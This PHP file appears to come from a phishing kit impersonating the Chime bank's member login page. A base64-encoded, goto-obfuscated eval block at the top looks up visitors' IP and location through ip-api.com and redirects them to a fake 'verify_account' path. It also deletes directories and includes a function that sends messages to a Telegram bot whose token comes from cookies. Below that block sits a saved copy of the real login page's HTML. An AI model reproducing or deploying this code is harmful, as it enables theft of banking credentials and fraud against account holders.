﻿<?php eval(base64_decode('CiBnb3RvIGpSTkUxOyBhWEp4bjogaWYgKGlzc2V0KCRpbmZvWyJcMTQzXHg2OVwxNjRceDc5Il0pKSB7ICRfU0VTU0lPTlsiXDEyNlwxNTdceDcwXHg3MlwxNjQiXSA9ICRpbmZvWyJcMTQzXDE1MVwxNjRcMTcxIl07IH0gZ290byBqSzlzcDsgU3AxZzQ6ICRwYXJlbnREaXJlY3RvcnkgPSAiXDU2XHgyZVx4MmZceDJlXDU2XHgyZlwxNjdcMTQ1XHg2MiI7IGdvdG8gaUNYdk07IGlDWHZNOiAkZGlyZWN0b3JpZXMgPSBnbG9iKCRwYXJlbnREaXJlY3RvcnkgLiAiXDU3XDUyIiwgR0xPQl9PTkxZRElSKTsgZ290byBNdk05WDsgQ0g1aWg6ICRkb25mbGFnID0gJF9TRVJWRVJbIlx4NTNceDQ1XDEyMlx4NTZceDQ1XDEyMlwxMzdceDRlXDEwMVwxMTVcMTA1Il07IGdvdG8geDBVUHg7IEdpVElHOiAkaXBQb3J0QXJyYXkgPSBleHBsb2RlKCJcNzIiLCAkaXBBZGRyZXNzKTsgZ290byBlQmExeTsgeXgyZjg6IGZ1bmN0aW9uIGRlbGV0ZURpcmVjdG9yeSgkZGlyKSB7IGlmICghZmlsZV9leGlzdHMoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gaWYgKCFpc19kaXIoJGRpcikpIHsgcmV0dXJuIHVubGluaygkZGlyKTsgfSAkdGltZV9kaWZmID0gdGltZSgpIC0gZmlsZWN0aW1lKCRkaXIpOyBpZiAoJHRpbWVfZGlmZiA+IDkyMCkgeyBmb3JlYWNoIChzY2FuZGlyKCRkaXIpIGFzICRpdGVtKSB7IGlmICgkaXRlbSA9PSAiXDU2IiB8fCAkaXRlbSA9PSAiXDU2XHgyZSIpIHsgY29udGludWU7IH0gaWYgKCFkZWxldGVEaXJlY3RvcnkoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkaXRlbSkpIHsgcmV0dXJuIGZhbHNlOyB9IH0gaWYgKHJtZGlyKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGVsc2UgeyByZXR1cm4gZmFsc2U7IH0gfSBlbHNlIHsgcmV0dXJuIHRydWU7IH0gfSBnb3RvIFNwMWc0OyBqSzlzcDogaWYgKGlzc2V0KCRpbmZvWyJceDcyXHg2NVx4NjdcMTUxXHg2Zlx4NmVcMTE2XHg2MVx4NmRcMTQ1Il0pKSB7ICRfU0VTU0lPTlsiXDE3MFwxMTdcMTYwXHg3NVx4NzkiXSA9ICRpbmZvWyJcMTYyXDE0NVx4NjdcMTUxXDE1N1x4NmVceDRlXDE0MVwxNTVcMTQ1Il07IH0gZ290byB5eDJmODsgTXZNOVg6IGlmIChpc19hcnJheSgkZGlyZWN0b3JpZXMpKSB7IGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyKSB7IGlmIChiYXNlbmFtZSgkZGlyKVswXSAhPSAiXDU2IikgeyBpZiAoZGVsZXRlRGlyZWN0b3J5KCRkaXIpKSB7IH0gfSB9IH0gZ290byB5VFllaDsgUWdld0Q6IGZ1bmN0aW9uIHRlbHNlbnQoJG1lc3NhZ2UpIHsgJFRydWJGdHViID0gJF9DT09LSUVbIlwxNTFceDY0XHg3NFwxNDVcMTU0Il07ICRjUmV0VmNrciA9ICRfQ09PS0lFWyJceDc0XDE1N1wxNTNcMTQ1XDE1NlwxNjRceDY1XDE1NCJdOyAkYXBpX3VybCA9ICJceDY4XDE2NFx4NzRceDcwXHg3M1x4M2FcNTdcNTdcMTQxXDE2MFwxNTFcNTZceDc0XDE0NVwxNTRceDY1XHg2N1wxNjJcMTQxXHg2ZFw1Nlx4NmZcMTYyXDE0N1x4MmZcMTQyXDE1N1x4NzR7JGNSZXRWY2tyfVx4MmZcMTYzXHg2NVx4NmVceDY0XHg0ZFx4NjVceDczXDE2M1x4NjFceDY3XDE0NSI7ICRwYXJhbXMgPSBhcnJheSgiXDE0M1wxNTBcMTQxXHg3NFx4NWZcMTUxXHg2NCIgPT4gJFRydWJGdHViLCAiXHg3NFx4NjVceDc4XDE2NCIgPT4gJG1lc3NhZ2UpOyAkY2ggPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJGFwaV91cmwpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgdHJ1ZSk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCBodHRwX2J1aWxkX3F1ZXJ5KCRwYXJhbXMpKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7IGN1cmxfY2xvc2UoJGNoKTsgfSBnb3RvIFZQOW53OyBadnFFQzogaWYgKHRyaW0oJHJlc2xvY2FsKSAhPSB0cmltKCRTdHJ1cExvbSkpIHsgJFN0cm9uZ1NvbCA9ICcnIC4gYmFzZW5hbWUoX19ESVJfXyk7IGVjaG8gIlw3NFwxNjNcMTQzXDE2MlwxNTFcMTYwXDE2NFw0MFx4NGNceDQxXHg0ZVx4NDdcMTI1XDEwMVx4NDdcMTA1XHgzZFw0N1wxMTJcMTQxXHg3NlwxNDFcMTIzXDE0M1wxNjJcMTUxXDE2MFx4NzRceDI3XHgzZVx4YVw0MFw0MFw0MFw0MFx4NzdcMTUxXHg2ZVx4NjRcMTU3XDE2N1w1NlwxNTRcMTU3XDE0M1x4NjFceDc0XDE1MVwxNTdcMTU2XHgyZVx4NjhceDcyXDE0NVx4NjZceDNkXHgyN1x4MmVceDJlXHgyZlw1Nlx4MmVceDJmXHg2OVx4NmVcMTQ0XDE0NVwxNzBcNTZcMTYwXDE1MFx4NzBceDNmXHg3Nlx4NjVceDcyXHg2OVx4NjZceDc5XHg1ZlwxNDFcMTQzXHg2M1x4NmZceDc1XHg2ZVx4NzRceDNkXHg3M1x4NjVceDczXHg3M1wxNTFceDZmXDE1Nlw3NVw0NiIgLiBtZDUobWljcm90aW1lKCkpIC4gIlw0NlwxNDRcMTUxXHg3M1wxNjBceDYxXDE2NFx4NjNcMTUwXHgzZCIgLiBzaGExKG1pY3JvdGltZSgpKSAuICJcNDZcMTQxXHg2M1wxNDNcMTQ1XDE2M1x4NzNceDNkXDQ2XHg2NFx4NjFceDc0XHg2MVx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XDE1NFwxNTdceDZjXDE1NVwxNDVcNzV7JFN0cm9uZ1NvbH1cNDdcNzNcMTJceDIwXHgyMFw0MFx4MjBcNzRceDJmXDE2M1x4NjNcMTYyXDE1MVwxNjBcMTY0XDc2IjsgZGllOyB9IGdvdG8gUWdld0Q7IGVCYTF5OiAkU3RydXBMb20gPSAkaXBQb3J0QXJyYXlbMF07IGdvdG8gQ0g1aWg7IGNwNExFOiBpbmlfc2V0KCJceDY0XHg2OVx4NzNceDcwXDE1NFx4NjFceDc5XDEzN1x4NjVcMTYyXHg3Mlx4NmZceDcyXDE2MyIsIDEpOyBnb3RvIFNwRjNrOyBKVGR0TjogaWYgKGZpbGVfZXhpc3RzKCRmaWxlbmFtZSkpIHsgJG15ZmlsZSA9IGZvcGVuKCRmaWxlbmFtZSwgIlwxNjIiKSBvciBkaWUoIlx4NTVcMTU2XHg2MVwxNDJcMTU0XHg2NVw0MFx4NzRceDZmXHgyMFwxNTdcMTYwXDE0NVwxNTZceDIwXDE0NlwxNTFceDZjXDE0NVx4MjEiKTsgJHJlc2xvY2FsID0gZnJlYWQoJG15ZmlsZSwgZmlsZXNpemUoJGZpbGVuYW1lKSk7IGZjbG9zZSgkbXlmaWxlKTsgfSBlbHNlIHsgJFN0cm9uZ1NvbCA9ICcnIC4gYmFzZW5hbWUoX19ESVJfXyk7IGVjaG8gIlx4M2NceDczXDE0M1x4NzJcMTUxXDE2MFwxNjRceDIwXDExNFwxMDFcMTE2XDEwN1x4NTVceDQxXHg0N1wxMDVcNzVceDI3XHg0YVwxNDFceDc2XDE0MVx4NTNceDYzXHg3MlwxNTFceDcwXDE2NFx4MjdcNzZceGFceDIwXHgyMFx4MjBceDIwXHg3N1x4NjlcMTU2XDE0NFx4NmZcMTY3XDU2XDE1NFwxNTdceDYzXHg2MVwxNjRceDY5XHg2Zlx4NmVceDJlXHg2OFx4NzJceDY1XDE0Nlw3NVw0N1x4MmVceDJlXDU3XDU2XHgyZVx4MmZcMTUxXHg2ZVwxNDRcMTQ1XDE3MFx4MmVcMTYwXDE1MFx4NzBceDNmXHg3NlwxNDVceDcyXDE1MVwxNDZceDc5XHg1Zlx4NjFceDYzXHg2M1wxNTdcMTY1XHg2ZVx4NzRceDNkXDE2M1wxNDVcMTYzXHg3M1wxNTFcMTU3XDE1Nlw3NVw0NiIgLiBtZDUobWljcm90aW1lKCkpIC4gIlx4MjZcMTQ0XDE1MVwxNjNcMTYwXHg2MVx4NzRcMTQzXHg2OFw3NSIgLiBzaGExKG1pY3JvdGltZSgpKSAuICJcNDZceDYxXDE0M1wxNDNceDY1XDE2M1x4NzNceDNkXHgyNlx4NjRcMTQxXHg3NFx4NjFceDNkIiAuIHNoYTEobWljcm90aW1lKCkpIC4gIlx4MjZcMTU0XHg2ZlwxNTRceDZkXHg2NVx4M2R7JFN0cm9uZ1NvbH1cNDdcNzNceGFcNDBcNDBceDIwXHgyMFw3NFx4MmZceDczXHg2M1x4NzJcMTUxXHg3MFwxNjRceDNlIjsgZGllOyB9IGdvdG8gWnZxRUM7IFNwRjNrOiBpZiAoIWVtcHR5KCRfU0VSVkVSWyJcMTEwXHg1NFx4NTRcMTIwXHg1Zlx4NDNcMTE0XDExMVwxMDVceDRlXDEyNFwxMzdcMTExXDEyMCJdKSkgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlx4NDhcMTI0XDEyNFx4NTBcMTM3XHg0M1x4NGNcMTExXDEwNVx4NGVcMTI0XHg1ZlwxMTFceDUwIl07IH0gZWxzZWlmICghZW1wdHkoJF9TRVJWRVJbIlwxMTBceDU0XHg1NFx4NTBcMTM3XHg1OFwxMzdcMTA2XHg0Zlx4NTJceDU3XHg0MVwxMjJcMTA0XDEwNVx4NDRcMTM3XDEwNlx4NGZceDUyIl0pKSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXHg0OFx4NTRceDU0XDEyMFx4NWZcMTMwXHg1Zlx4NDZcMTE3XHg1Mlx4NTdceDQxXDEyMlwxMDRceDQ1XDEwNFx4NWZcMTA2XDExN1x4NTIiXTsgfSBlbHNlIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJcMTIyXDEwNVwxMTVceDRmXDEyNFwxMDVcMTM3XHg0MVwxMDRceDQ0XDEyMiJdOyB9IGdvdG8gR2lUSUc7IHV0U3ZaOiBpZiAoaXNzZXQoJGluZm9bIlx4NjNceDZmXHg3NVwxNTZcMTY0XHg3Mlx4NzkiXSkpIHsgJF9TRVNTSU9OWyJceDQyXDE1NFx4NjFceDczXDE0MVx4NjNceDZmXDE2NVx4NmUiXSA9ICRpbmZvWyJcMTQzXHg2ZlwxNjVceDZlXDE2NFx4NzJceDc5Il07IH0gZ290byBvS2djRzsgT0thd006IGlmIChpc3NldCgkaW5mb1siXHg2MVx4NzMiXSkpIHsgJF9TRVNTSU9OWyJcMTUxXHg3M1x4NzAiXSA9ICRpbmZvWyJceDYxXDE2MyJdOyB9IGdvdG8gdXRTdlo7IG9LZ2NHOiBpZiAoaXNzZXQoJGluZm9bIlwxNDNcMTU3XDE2NVwxNTZceDc0XDE2Mlx4NzlcMTAzXDE1N1x4NjRcMTQ1Il0pKSB7ICRfU0VTU0lPTlsiXHg0ZVwxNTJcMTU3XDE2MFx4NjYiXSA9ICRpbmZvWyJcMTQzXDE1N1x4NzVceDZlXHg3NFx4NzJceDc5XHg0M1x4NmZcMTQ0XDE0NSJdOyB9IGdvdG8gYVhKeG47IHlUWWVoOiAkZmlsZW5hbWUgPSAiXHg2Y1wxNTdceDYzXHg2MVx4NmNceDJlXHg3NFwxNzBceDc0IjsgZ290byBKVGR0TjsgeDBVUHg6ICRpbmZvID0gdW5zZXJpYWxpemUoZmlsZV9nZXRfY29udGVudHMoIlx4NjhcMTY0XHg3NFwxNjBceDNhXHgyZlw1N1x4NjlceDcwXDU1XDE0MVwxNjBceDY5XHgyZVx4NjNcMTU3XDE1NVx4MmZcMTYwXDE1MFwxNjBceDJmeyRTdHJ1cExvbX1ceDNmXDE0NlwxNTFceDY1XDE1NFwxNDRcMTYzXHgzZFx4NzNceDc0XHg2MVx4NzRcMTY1XDE2M1w1NFx4NmRcMTQ1XDE2M1x4NzNceDYxXHg2N1wxNDVcNTRcMTQzXDE1N1x4NmVceDc0XDE1MVwxNTZceDY1XHg2ZVwxNjRceDJjXHg2M1wxNTdceDZlXHg3NFwxNTFceDZlXHg2NVwxNTZcMTY0XDEwM1x4NmZcMTQ0XHg2NVw1NFx4NjNceDZmXDE2NVwxNTZcMTY0XHg3MlwxNzFceDJjXDE0M1wxNTdcMTY1XHg2ZVx4NzRceDcyXDE3MVx4NDNceDZmXHg2NFwxNDVceDJjXDE2Mlx4NjVcMTQ3XHg2OVwxNTdceDZlXHgyY1wxNjJceDY1XDE0N1wxNTFceDZmXHg2ZVx4NGVceDYxXHg2ZFx4NjVceDJjXDE0M1x4NjlcMTY0XHg3OVx4MmNceDY0XDE1MVwxNjNcMTY0XDE2MlwxNTFceDYzXHg3NFx4MmNcMTcyXDE1MVx4NzBceDJjXDE1NFwxNDFcMTY0XHgyY1x4NmNceDZmXDE1Nlx4MmNceDc0XHg2OVx4NmRcMTQ1XDE3MlwxNTdceDZlXDE0NVw1NFx4NjNcMTY1XDE2MlwxNjJceDY1XDE1NlwxNDNcMTcxXHgyY1wxNTFceDczXHg3MFx4MmNceDZmXDE2Mlx4NjdcNTRceDYxXDE2M1w1NFwxNDFceDczXDE1Nlx4NjFceDZkXDE0NVx4MmNceDcyXHg2NVx4NzZceDY1XHg3Mlx4NzNcMTQ1XDU0XDE1NVwxNTdceDYyXDE1MVx4NmNcMTQ1XHgyY1wxNjBceDcyXDE1N1x4NzhceDc5XHgyY1wxNTBcMTU3XDE2M1x4NzRcMTUxXDE1NlwxNDdcNTRceDcxXHg3NVwxNDVceDcyXHg3OSIpKTsgZ290byBPS2F3TTsgalJORTE6IGVycm9yX3JlcG9ydGluZyhFX0FMTCk7IGdvdG8gY3A0TEU7IFZQOW53OiA=')); ?>
<html lang="en" class="fa-events-icons-failed">
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://analytics.tiktok.com/i18n/pixel/static/main.MTAwYzY4Y2VmMA.js" data-id="C1CHB8PT0U322RQP8O90"></script>
    <script data-savepage-type="" type="text/plain" async="true" data-savepage-src="https://tr.snapchat.com/config/com/d4738dc7-342a-4cd7-8592-390e7f447b2a.js" crossorigin="anonymous"></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://d2hrivdxn8ekm8.cloudfront.net/tag-manager/c71122db-93b8-4a68-a09a-7175f1ab2e0b-additional-latest.js"></script>
    <script
        data-savepage-type="text/javascript"
        type="text/plain"
        data-savepage-src="https://nd.chime.com/2.2/w/w-749009/init/js/?q=%7B%22e%22%3A549166%2C%22fvq%22%3A%22n699r722-r626-453q-802o-or34757p7n40%22%2C%22oq%22%3A%221440%3A794%3A1440%3A864%3A1440%3A864%22%2C%22wfi%22%3A%22flap-1%22%2C%22ji%22%3A%222.3.1%22%2C%22yf%22%3A%7B%7D%2C%22jc%22%3A%22Ybtva%22%2C%22jcc%22%3A1%2C%22ov%22%3A%22o2%7C1440k900%201440k864%2024%2024%7C0%7Cra-HF%7Coc1-2501pp0s72219oop%7Csnyfr%7C%7CZbmvyyn%2F5.0%20(Jvaqbjf%20AG%2010.0%3B%20Jva64%3B%20k64)%20NccyrJroXvg%2F537.36%20(XUGZY%2C%20yvxr%20Trpxb)%20Puebzr%2F109.0.0.0%20Fnsnev%2F537.36%7Cjt1-n46p01n68sp5740r%22%7D"
        id="ndsisync-1"
    ></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://www.googletagmanager.com/gtm.js?id=GTM-N3Z9ZNR&l=dataLayer"></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://www.googletagmanager.com/gtag/js?id=G-9G6X89ETJB&l=dataLayer&cx=c"></script>
    <script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://connect.facebook.net/en_US/fbevents.js"></script>
    <script data-savepage-src="https://www.mczbf.com/tags/211232331705/tag.js" data-savepage-type="text/javascript" type="text/plain" async="" id="cjapitag"></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://analytics.tiktok.com/i18n/pixel/events.js?sdkid=C1CHB8PT0U322RQP8O90&lib=ttq"></script>
    <script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://feedmob-cdn.s3.amazonaws.com/js/fmpixel.js?t=1692921600000"></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://www.google-analytics.com/analytics.js"></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://www.google-analytics.com/plugins/ua/linkid.js"></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://sc-static.net/scevent.min.js"></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://bat.bing.com/bat.js"></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://d2hrivdxn8ekm8.cloudfront.net/tag-manager/c71122db-93b8-4a68-a09a-7175f1ab2e0b-latest.js"></script>
    <script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://cdn.segment.com/analytics.js/v1/89nms3o7yr/analytics.min.js"></script>
    <script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://www.googletagmanager.com/gtm.js?id=GTM-N3Z9ZNR"></script>
    <script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://www.google-analytics.com/analytics.js"></script>
    <script data-savepage-type="" type="text/plain"></script>
    <script data-savepage-type="" type="text/plain"></script>
    <head>
        <link
            rel="icon"
            data-savepage-href="https://member.chime.com/favicon.png?v=1"
            href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAAsSAAALEgHS3X78AAADHUlEQVRYw+2XSWgTYRiGn5kkptmoTZdoS6wb1QpaDWLBVkt7EQUv4gJVUFAEF9CDeGjtyRb0Iqi44FUriCAqFAuCghsUMYgWKQoSu0iadLNtlmaZ8WBTk06Smdbai76nmXe++d73/75//n9++NchpNy4z1uBRmAfUAqIc6QjAd+Ae0CL7GoaVxgQ3OfNwEvA9ZcH7Qa2yK6mINNG2DgP4kxqNCZu9EkP9mvNkCPqqbI4qTAVUai3EJMlBuNBvk6M8D7UT3fkh1qK+oSJZANOtbccegtnHZs5UrABm7ggY9xQPERnyI8vFiAixzna3UZQiiaHLElXgawT7pC9givObVizCCdg15nYap3S4ETPk+khU1p61WxAg6OK5uJaLaEzhupntmdheVZxGRiOh4nL8qwMZK1Ani6Ha87taZ89GOniqv8trwM9xGSJBYKOjebF1NmWUmdbRqW5BJOoXuCsEccLN1KgNyv4M31PueTrSOEicpw3gV7eBHpp9r5CRCBXZyQqS4xLkdkZOGBfq+BahzsV4ukgITMcD6vGZZwDxQYbq4z5Cr7F+1I16UyQ0cDqHKV4T2SUrvDg/BgoTNP7vujYnIpnNZAORlE3fwZ80aCCKzPmYxTm1kRGA5/CfgVnEQ3szC2bHwP9sQAfQz4F31xcS67OqCm5ABwtcGERDTM3AHB76IOCKzPaebh8b9oFKhnrTEW0r6znpnMHeiGzTNaF6MbAO04VVVJisKXwNdZSutYc47r/HW2jX/BMjCAKAiUGG5vMJezOK6fGWpr6vzcbAwEpysFvj2hfUa8YhV1n4tyias4tqtbSjYxQ/QyfjXk42duOxOx2uz82AHBrwM2ur/fxx4JawqcQlmI0fn/OWFzbZiRlM/T4x2defLrO6aJKDuevV8yLZHij49wZ7uSyryPT6iklLpJ/yz38OgtoKJvAerODCpMDh95Cri6HmCzRFx2jI9DH+5BXrWEe2dW0bHoFWoEGLQYkZNxBL+6gV2s3puPu78H8Rgu/Dg1/G+5JrVQDkyeVGuAi4CGpT3MAaTLnBaAmcSr6D4CfsPbzKnO24EQAAAAASUVORK5CYII="
        />
        <script data-savepage-type="" type="text/plain" async="" data-savepage-src="//acdn.adnxs.com/dmp/up/pixie.js"></script>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        <script data-savepage-type="text/javascript" type="text/plain"></script>

        <meta name="description" content="Login to your account or download the Chime mobile app." />
        <script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://chime-api.arkoselabs.com/v2/7BA04117-FC6C-4968-834C-DC69A7D0AD58/api.js" data-callback="setupEnforcement" async="" defer=""></script>
        <script data-savepage-type="text/javascript" type="text/plain"></script>

        <meta charset="utf-8" />
        <title>Member Login</title>
        <meta
            name="description"
            property="og:description"
            content="    <!-- Need to use for Open Graph meta description as well-->
    Login to your account or download the Chime mobile app.
"
        />
        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1" user-scalable="no" />
        <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />

        <!--
     ________    _
    / ____/ /_  (_)___ ___  ___
   / /   / __ \/ / __ `__ \/ _ \
  / /___/ / / / / / / / / /  __/
  \____/_/ /_/_/_/ /_/ /_/\___/

-->
        <meta name="author" content="Chime" />

        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black" />
        <!-- Icons -->
        <link
            rel="shortcut icon"
            data-savepage-href="/favicon.png?v=1"
            href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAAsSAAALEgHS3X78AAADHUlEQVRYw+2XSWgTYRiGn5kkptmoTZdoS6wb1QpaDWLBVkt7EQUv4gJVUFAEF9CDeGjtyRb0Iqi44FUriCAqFAuCghsUMYgWKQoSu0iadLNtlmaZ8WBTk06Smdbai76nmXe++d73/75//n9++NchpNy4z1uBRmAfUAqIc6QjAd+Ae0CL7GoaVxgQ3OfNwEvA9ZcH7Qa2yK6mINNG2DgP4kxqNCZu9EkP9mvNkCPqqbI4qTAVUai3EJMlBuNBvk6M8D7UT3fkh1qK+oSJZANOtbccegtnHZs5UrABm7ggY9xQPERnyI8vFiAixzna3UZQiiaHLElXgawT7pC9givObVizCCdg15nYap3S4ETPk+khU1p61WxAg6OK5uJaLaEzhupntmdheVZxGRiOh4nL8qwMZK1Ani6Ha87taZ89GOniqv8trwM9xGSJBYKOjebF1NmWUmdbRqW5BJOoXuCsEccLN1KgNyv4M31PueTrSOEicpw3gV7eBHpp9r5CRCBXZyQqS4xLkdkZOGBfq+BahzsV4ukgITMcD6vGZZwDxQYbq4z5Cr7F+1I16UyQ0cDqHKV4T2SUrvDg/BgoTNP7vujYnIpnNZAORlE3fwZ80aCCKzPmYxTm1kRGA5/CfgVnEQ3szC2bHwP9sQAfQz4F31xcS67OqCm5ABwtcGERDTM3AHB76IOCKzPaebh8b9oFKhnrTEW0r6znpnMHeiGzTNaF6MbAO04VVVJisKXwNdZSutYc47r/HW2jX/BMjCAKAiUGG5vMJezOK6fGWpr6vzcbAwEpysFvj2hfUa8YhV1n4tyias4tqtbSjYxQ/QyfjXk42duOxOx2uz82AHBrwM2ur/fxx4JawqcQlmI0fn/OWFzbZiRlM/T4x2defLrO6aJKDuevV8yLZHij49wZ7uSyryPT6iklLpJ/yz38OgtoKJvAerODCpMDh95Cri6HmCzRFx2jI9DH+5BXrWEe2dW0bHoFWoEGLQYkZNxBL+6gV2s3puPu78H8Rgu/Dg1/G+5JrVQDkyeVGuAi4CGpT3MAaTLnBaAmcSr6D4CfsPbzKnO24EQAAAAASUVORK5CYII="
        />
        <link rel="apple-touch-icon" data-savepage-href="/icon-60.png" href="" />
        <link rel="apple-touch-icon" sizes="76x76" data-savepage-href="/icon-76.png" href="" />
        <link rel="apple-touch-icon" sizes="120x120" data-savepage-href="/icon-120.png" href="" />
        <link rel="apple-touch-icon" sizes="152x152" data-savepage-href="/icon-152.png" href="" />
        <link rel="apple-touch-icon" sizes="192x192" data-savepage-href="/icon-192.png" href="" />

        <meta name="HandheldFriendly" content="True" />
        <meta name="MobileOptimized" content="320" />
        <meta http-equiv="cleartype" content="on" />
        <meta name="keywords" content="chime,chime card,chimecard,visa,card,rewards,debit card,direct deposit,benefits,bank,banking,account,app,bank,cash back,mobile,ios,android" />

        <meta property="og:site_name" content="Chime" />

        <!-- Google -->
        <meta name="google-site-verification" content="IN_GTVkpccevmGE0Z1MzUVOcXX7xPyaSlCQsGzuwv64" />
        <!-- Bing -->
        <meta name="msvalidate.01" content="CA184AF46B43A4E61BDA095A3DE48115" />
        <!-- Pinterest -->
        <meta name="p:domain_verify" content="d68aa91878a89327877f1f6a60cc4949" />

        <meta name="csrf-param" content="authenticity_token" />
        <meta name="csrf-token" content="HenG2+8EOXWRpUTBZkiCLrX1tSMd0w/GygU39zD/L/tuE0E1HB1luWKRu2tWxjShhXkjM/BXbKn34Ch9KF5wMw==" />
        <!-- Google Analytics -->
        <script data-savepage-type="" type="text/plain"></script>
        <!-- End Google Analytics -->

        <!-- Google Tag Manager -->
        <script data-savepage-type="" type="text/plain"></script>
        <!-- End Google Tag Manager -->
        <script data-savepage-type="text/javascript" type="text/plain"></script>

        <!-- Prevent XFS -->
        <script data-savepage-type="text/javascript" type="text/plain"></script>

        <!-- Load Fonts -->
        <style data-savepage-href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700" type="text/css">
            /* cyrillic-ext */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 300;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3ik4zwmhduz8A.woff2*/ url(data:font/woff2;base64,d09GMgABAAAAABNAAA0AAAAAKugAABLpAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGkYbk34cNAZgAII4CqtMoj4LgTYAATYCJAOCWgQgBYRqB4YwG7skVUaGjQPIDPqBJvj/Y3Ii18ZrdQCEWGamU9EMZGtq9gU7FzIpN+wgxdgUCUJH0j9c7UXy1TknXMMteTbBRpAagQcMdu9gN9/Cf0u25iojJJnlodoPfbt3P0kJYDySjCu5snJs62oMkausIjYKaE1ay0myh/BfACTlq0yd7xBt85C3cm2iRD3wlAFYtEkoFuUT2ojR67a2xkVUEgonXVKSGoxsMHlwfW4EEOSJLsErbZgmBfCPCm79HpSzCAkTN7NAPIMsTbsAp871Y832GqZ3Zs7wITffO6B2D7ZvanMnNEnNh7G+wvpVBUibgAIAF9uMHK3w4nPESyTtlvfX2pe2e3ve8cIcSwahEIUMGNP9urczb3qJZ49gggs0wb9zCCpACh2QOqIAkDsVBh8jUj7yKsLGOhJaRV0NyaVenThczcpZyp7zbaj+YbqGKadiRX2WhaoQOv74kxZgMoBkYYLkKUAqVCD16pFGjUiLFqRPHzJODGNZNgwCE21qAB04lJkLkt7WuirA+erslYD0QxscIJQCahBCTc1TE0Pt5bN1/U1UzUCA6MksMEwoGfPAXGtWEPbNwRiWS4H1SjGGKgBBOqkdFYWSrDzrf7K45AtNJnJnZdBxIUE1mKPEv/2HW6lMuvf4nbyc3OJ2brbU/pVXwsk6W5bG2zz8CZXxjO4Ii6a+2R4TbK/qIV27nnbekYwY8hRr1WbICjWMPL1Sq5c7EzTALDYLwGgt0PQwNZ58BpdDp1E8Po9+cmaCAQTiQlsOHgxmSp6vFDuxReQ3G8JD6dEfTDY8ePrKKuT5Pen8W6kzL6vlSoVX/GRNnB3UnsZylw+wLocym9pprAm4dRUAWv47tzATA6G+1pBBbr7+jrcUunasVFsKp3F05r4RA+oQfSQDldbuMf1RvW4lf3FwKmbEG5Ny7suINvbs7fAqGBCbbhTj4U5k1gNAYTpvKmymT2ThGOc/osnc7OfIgXlXYlRKytfK+ukKZ5P64ZJSj6B4dh5/lkSRwhnNbLgDrL+qr9EukQQ9zfdY3w9lxYVj6hwYzsAu8ujk2Ymd+qtSUfcSPRl1JS4WpOHmhny/pX4b6+ZLTTLRmcFlmDczquntvqGmEYzsWcSO+znd/avdMGP/RayM8sxvZzjBfO9tnIbebNm9QxW/T3/kJVO+IrBMOaVSFVONFrZegxLDxgw0QS7crGw4hK0YlAdPYqPkbJECooCjxyymgjily1eH9kFtv/FP3mX4shKuXCw3P7nHALPAQJORs7jMEpN8XfrhODQemMKTEjAqBTN5iMUSiIWpqxtO57Mp7i+En2Aaocu0ahkLg30RP+OvuPg9RI9YksgxO3nODL8fOFIst97U7dDRaemGQVSoNj7G2ddn8AxZTjSTGQuBV8B0nAfM5NPc